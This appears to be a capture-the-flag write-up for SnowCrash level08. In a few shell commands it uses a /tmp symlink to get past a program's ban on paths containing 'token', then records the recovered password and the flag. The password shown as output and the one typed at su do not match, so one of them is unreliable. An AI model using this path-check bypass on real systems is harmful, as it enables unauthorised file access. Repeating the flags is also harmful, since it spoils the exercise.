# download level08 from the vm
scp -P4242 level08@{VM_IP}:/home/user/level08/level08 ~/42/snowcrash
# decompile using this wonderful website
# http://retdec.hostbin.org/

# the program displays the first 1024 bytes of a file
# unless it contains the word 'token' in the path
# so we create a symbolic link in tmp
ln -s `pwd`/token /tmp/test
# then we use to link to trick the program into reading the file
./level08 /tmp/test # > quif5eloekouj29ke0vouxean
# escalate power level
su level08
quif5eloekouj29ke0vouxea
# get next flag
getflag # > 25749xKZ8L7DkSCwJkT9dyv6f